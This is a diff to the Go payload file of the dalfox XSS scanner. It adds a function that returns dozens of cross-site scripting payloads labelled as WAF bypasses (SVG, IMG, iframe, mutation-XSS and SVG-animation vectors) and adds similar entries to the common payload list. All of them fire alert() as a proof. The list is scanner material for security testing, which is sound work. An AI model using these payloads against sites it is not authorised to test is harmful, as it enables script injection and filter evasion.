@@ -55,6 +55,102 @@ func GetBlindPayload() []string {
 	return payload
 }
 
+// GetWAFBypassPayloads returns WAF bypass payloads for various WAF systems
+func GetWAFBypassPayloads() []string {
+	return []string{
+		// SVG-based bypasses
+		"<svg onload=alert(1)>",
+		"<svg/onload=alert(1)>",
+		"<svg onload=alert`1`>",
+		"<svg onload=alert&lpar;1&rpar;>",
+
+		// IMG-based bypasses
+		"<img src=x onerror=alert(1)>",
+		"<img/src=x/onerror=alert(1)>",
+		"<img src=x onerror=alert`1`>",
+		"<img src=x onerror=alert&lpar;1&rpar;>",
+
+		// SCRIPT-based bypasses
+		"<script>alert(1)</script>",
+		"<script>alert`1`</script>",
+		"<script>alert&lpar;1&rpar;</script>",
+		"<script src=data:,alert(1)></script>",
+
+		// IFRAME-based bypasses
+		"<iframe src=javascript:alert(1)></iframe>",
+		"<iframe/src=javascript:alert(1)></iframe>",
+		"<iframe src=data:text/html,<script>alert(1)</script>></iframe>",
+
+		// OBJECT-based bypasses
+		"<object data=javascript:alert(1)></object>",
+		"<object/data=javascript:alert(1)></object>",
+		"<object data=data:text/html,<script>alert(1)</script>></object>",
+
+		// EMBED-based bypasses
+		"<embed src=javascript:alert(1)></embed>",
+		"<embed/src=javascript:alert(1)></embed>",
+		"<embed src=data:text/html,<script>alert(1)</script>></embed>",
+
+		// MARQUEE-based bypasses
+		"<marquee onstart=alert(1)></marquee>",
+		"<marquee/onstart=alert(1)></marquee>",
+		"<marquee onstart=alert`1`></marquee>",
+
+		// DETAILS-based bypasses
+		"<details open ontoggle=alert(1)></details>",
+		"<details/open/ontoggle=alert(1)></details>",
+		"<details open ontoggle=alert`1`></details>",
+
+		// VIDEO-based bypasses
+		"<video onloadstart=alert(1)></video>",
+		"<video/onloadstart=alert(1)></video>",
+		"<video onloadstart=alert`1`></video>",
+
+		// AUDIO-based bypasses
+		"<audio onloadstart=alert(1)></audio>",
+		"<audio/onloadstart=alert(1)></audio>",
+		"<audio onloadstart=alert`1`></audio>",
+
+		// INPUT-based bypasses
+		"<input onfocus=alert(1) autofocus>",
+		"<input/onfocus=alert(1)/autofocus>",
+		"<input onfocus=alert`1` autofocus>",
+
+		// SELECT-based bypasses
+		"<select onfocus=alert(1) autofocus></select>",
+		"<select/onfocus=alert(1)/autofocus></select>",
+		"<select onfocus=alert`1` autofocus></select>",
+
+		// TEXTAREA-based bypasses
+		"<textarea onfocus=alert(1) autofocus></textarea>",
+		"<textarea/onfocus=alert(1)/autofocus></textarea>",
+		"<textarea onfocus=alert`1` autofocus></textarea>",
+
+		// KEYGEN-based bypasses
+		"<keygen onfocus=alert(1) autofocus>",
+		"<keygen/onfocus=alert(1)/autofocus>",
+		"<keygen onfocus=alert`1` autofocus>",
+
+		// BUTTON-based bypasses
+		"<button onfocus=alert(1) autofocus></button>",
+		"<button/onfocus=alert(1)/autofocus></button>",
+		"<button onfocus=alert`1` autofocus></button>",
+
+		// FORM-based bypasses
+		"<form><button formaction=javascript:alert(1)>Click</button></form>",
+		"<form><input type=submit formaction=javascript:alert(1) value=Click></form>",
+
+		// MATH-based bypasses
+		"<math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><path id=\"</textarea><img onerror=alert(1) src=x>\"></path></svg></mglyph></mtext></math>",
+
+		// SVG animate/set/foreignObject/use bypasses
+		"<svg><animate onbegin=alert(1) attributeName=x></animate></svg>",
+		"<svg><set onbegin=alert(1) attributeName=x></set></svg>",
+		"<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>",
+		"<svg><use href=\"data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'></svg>\"></use></svg>",
+	}
+}
+
 // GetCommonPayload is return xss
 func GetCommonPayload() []string {
 	payload := []string{
@@ -77,7 +173,7 @@ func GetCommonPayload() []string {
 		"\"><img/src/onerror=.1|alert`` class=dalfox>",
 		"'><img/src/onerror=.1|alert`` class=dalfox>",
 
-		//  Modern XSS Payloads 
+		//  Modern XSS Payloads
 		"\"><IMG SRC=x onafterprint=\"alert(String.fromCharCode(88,83,83))\" class=dalfox>",
 		"\"><IMG SRC=x onbeforeprint=\"alert(String.fromCharCode(88,83,83))\" class=dalfox>",
 		"\"><IMG SRC=x onbeforeunload=\"alert(String.fromCharCode(88,83,83))\" class=dalfox>",
@@ -98,6 +194,54 @@ func GetCommonPayload() []string {
 		"\"><IMG SRC=x ondragleave=\"alert(String.fromCharCode(88,83,83))\" class=dalfox>",
 		"\"><IMG SRC=x ondragover=\"alert(String.fromCharCode(88,83,83))\" class=dalfox>",
 		"\"><IMG SRC=x ondragstart=\"alert(String.fromCharCode(88,83,83))\" class=dalfox>",
+
+		// WAF Bypass Payloads (Issue #750)
+		"><svg/onload=alert(DALFOX_ALERT_VALUE)//>",
+		"'><svg/onload=alert(DALFOX_ALERT_VALUE)//>",
+		"><img src=x onerror=alert(DALFOX_ALERT_VALUE)//>",
+		"'><img src=x onerror=alert(DALFOX_ALERT_VALUE)//>",
+		"><script>alert(DALFOX_ALERT_VALUE)</script>",
+		"'><script>alert(DALFOX_ALERT_VALUE)</script>",
+		"><iframe src=javascript:alert(DALFOX_ALERT_VALUE)></iframe>",
+		"'><iframe src=javascript:alert(DALFOX_ALERT_VALUE)></iframe>",
+		"><object data=javascript:alert(DALFOX_ALERT_VALUE)></object>",
+		"'><object data=javascript:alert(DALFOX_ALERT_VALUE)></object>",
+		"><embed src=javascript:alert(DALFOX_ALERT_VALUE)></embed>",
+		"'><embed src=javascript:alert(DALFOX_ALERT_VALUE)></embed>",
+		"><marquee onstart=alert(DALFOX_ALERT_VALUE)></marquee>",
+		"'><marquee onstart=alert(DALFOX_ALERT_VALUE)></marquee>",
+		"><details open ontoggle=alert(DALFOX_ALERT_VALUE)></details>",
+		"'><details open ontoggle=alert(DALFOX_ALERT_VALUE)></details>",
+		"><video><source onerror=alert(DALFOX_ALERT_VALUE)></video>",
+		"'><video><source onerror=alert(DALFOX_ALERT_VALUE)></video>",
+		"><audio><source onerror=alert(DALFOX_ALERT_VALUE)></audio>",
+		"'><audio><source onerror=alert(DALFOX_ALERT_VALUE)></audio>",
+		"><input onfocus=alert(DALFOX_ALERT_VALUE) autofocus>",
+		"'><input onfocus=alert(DALFOX_ALERT_VALUE) autofocus>",
+		"><select onfocus=alert(DALFOX_ALERT_VALUE) autofocus><option>test</option></select>",
+		"'><select onfocus=alert(DALFOX_ALERT_VALUE) autofocus><option>test</option></select>",
+		"><textarea onfocus=alert(DALFOX_ALERT_VALUE) autofocus></textarea>",
+		"'><textarea onfocus=alert(DALFOX_ALERT_VALUE) autofocus></textarea>",
+		"><keygen onfocus=alert(DALFOX_ALERT_VALUE) autofocus>",
+		"'><keygen onfocus=alert(DALFOX_ALERT_VALUE) autofocus>",
+		"><button onfocus=alert(DALFOX_ALERT_VALUE) autofocus>test</button>",
+		"'><button onfocus=alert(DALFOX_ALERT_VALUE) autofocus>test</button>",
+		"><form><button formaction=javascript:alert(DALFOX_ALERT_VALUE)>test</button></form>",
+		"'><form><button formaction=javascript:alert(DALFOX_ALERT_VALUE)>test</button></form>",
+		"><math><mi//xlink:href=data:x,<script>alert(DALFOX_ALERT_VALUE)</script>>",
+		"'><math><mi//xlink:href=data:x,<script>alert(DALFOX_ALERT_VALUE)</script>>",
+		"><svg><animate onbegin=alert(DALFOX_ALERT_VALUE) attributeName=x dur=1s>",
+		"'><svg><animate onbegin=alert(DALFOX_ALERT_VALUE) attributeName=x dur=1s>",
+		"><svg><animateTransform onbegin=alert(DALFOX_ALERT_VALUE) attributeName=transform>",
+		"'><svg><animateTransform onbegin=alert(DALFOX_ALERT_VALUE) attributeName=transform>",
+		"><svg><animateMotion onbegin=alert(DALFOX_ALERT_VALUE) path=M20,20L20,50>",
+		"'><svg><animateMotion onbegin=alert(DALFOX_ALERT_VALUE) path=M20,20L20,50>",
+		"><svg><set onbegin=alert(DALFOX_ALERT_VALUE) attributeName=x to=0>",
+		"'><svg><set onbegin=alert(DALFOX_ALERT_VALUE) attributeName=x to=0>",
+		"><svg><foreignObject><img src=x onerror=alert(DALFOX_ALERT_VALUE)></foreignObject>",
+		"'><svg><foreignObject><img src=x onerror=alert(DALFOX_ALERT_VALUE)></foreignObject>",
+		"><svg><use href=data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg' onload='alert(DALFOX_ALERT_VALUE)'></svg>#x>",
+		"'><svg><use href=data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg' onload='alert(DALFOX_ALERT_VALUE)'></svg>#x>",
 		"\"><IMG SRC=x ondrop=\"alert(String.fromCharCode(88,83,83))\" class=dalfox>",
 		"\"><IMG SRC=x oncopy=\"alert(String.fromCharCode(88,83,83))\" class=dalfox>",
 		"\"><IMG SRC=x oncut=\"alert(String.fromCharCode(88,83,83))\" class=dalfox>",
@@ -208,7 +352,7 @@ func GetHTMLPayload(ip string) []string {
 		"<sVg/onload=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE)>",
 		"<ScRipt>DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE)</script>",
 		"<dalfox class=dalfox>",
-		
+
 		// Modern HTML5 Payloads
 		"<video controls oncanplay=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE) class=dalfox><source src=1.mp4></video>",
 		"<canvas onwebglcontextlost=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE) class=dalfox></canvas>",
@@ -225,12 +369,12 @@ func GetHTMLPayload(ip string) []string {
 		"<keygen onload=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE) class=dalfox>",
 		"<summary ontoggle=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE) class=dalfox>Click</summary>",
 		"<details ontoggle=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE) class=dalfox open><summary>XSS</summary></details>",
-		
+
 		//  Web Components & Shadow DOM
 		"<custom-element onconnectedcallback=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE) class=dalfox></custom-element>",
 		"<web-component onattributechangedcallback=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE) class=dalfox></web-component>",
 		"<shadow-host ondisconnectedcallback=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE) class=dalfox></shadow-host>",
-		
+
 		//  Modern Event Handlers
 		"<div onpointerrawupdate=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE) class=dalfox></div>",
 		"<div ongotpointercapture=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE) class=dalfox></div>",
